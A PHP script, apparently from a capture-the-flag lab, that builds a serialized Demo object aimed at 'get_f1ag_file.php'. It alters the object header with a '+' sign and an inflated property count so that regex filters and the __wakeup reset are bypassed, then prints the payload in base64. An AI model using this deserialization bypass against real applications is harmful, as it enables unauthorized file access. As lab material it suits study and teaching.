<?php
//error_reporting(0);
function filterChars($inputString) {
    $pattern = '/flag|hint|\$|\/|\*|\(|\)/i';
    return preg_match($pattern, $inputString);
}


class Demo {
    private $file = 'hint.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
//        echo @highlight_file($this->file, true);
        echo "\n".$this->file."\n";

    }

    function __wakeup() {
        if ($this->file != 'hint.php') {
            $this->file = 'hint.php';  // Real tips maybe in h1nt.php?
        }
    }
}

$a = new Demo("get_f1ag_file.php");
$a = serialize($a);
$b = str_replace('O:4:"Demo":1:', 'O:+4:"Demo":3:', $a);
echo $b."\n";
echo base64_encode($b);
